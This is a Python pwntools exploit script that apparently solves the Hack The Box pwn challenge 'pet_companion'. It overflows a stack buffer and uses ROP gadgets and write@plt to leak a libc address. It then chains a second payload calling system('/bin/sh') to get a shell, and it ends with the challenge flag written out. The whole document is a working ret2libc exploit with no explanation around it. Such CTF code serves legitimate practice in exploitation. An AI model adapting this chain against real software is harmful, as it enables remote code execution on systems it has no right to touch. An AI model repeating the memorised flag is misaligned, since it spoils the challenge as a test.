#!/bin/python
from pwn import *
exe = ELF('./pet_companion_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
p = process(exe.path)
# p = remote('83.136.250.41',40268)
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
#
#
#            ''')
#################exploiting#####################
pop_rdi = 0x0000000000400743
pop_rsi_r15 = 0x0000000000400741
write_plt = 0x4004f0
ret = 0x00000000004006df
main_back = 0x000000000040064b
payload = b''.ljust(0x48)
payload += p64(pop_rsi_r15) 
payload += p64(0x600fd8)
payload += p64(0)
payload += p64(write_plt)
payload += p64(main_back)
p.sendlineafter(b'current status:',payload)
p.recvuntil(b'\n')
p.recvuntil(b'guring...')
p.recv(2)
leak_addr = u64(p.recv(8))
base_libc = leak_addr -0x1100f0
log.info(f'leak_addr: {hex(leak_addr)}')
system_libc = base_libc + libc.symbols['system']
bin_sh = base_libc + 0x1b3d88
payload = b''.ljust(0x48)
payload += p64(0x00000000004006df)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_libc)
p.sendlineafter(b'current status:',payload)
##############the end###########################
#HTB{c0nf1gur3_w3r_d0g}
p.interactive()
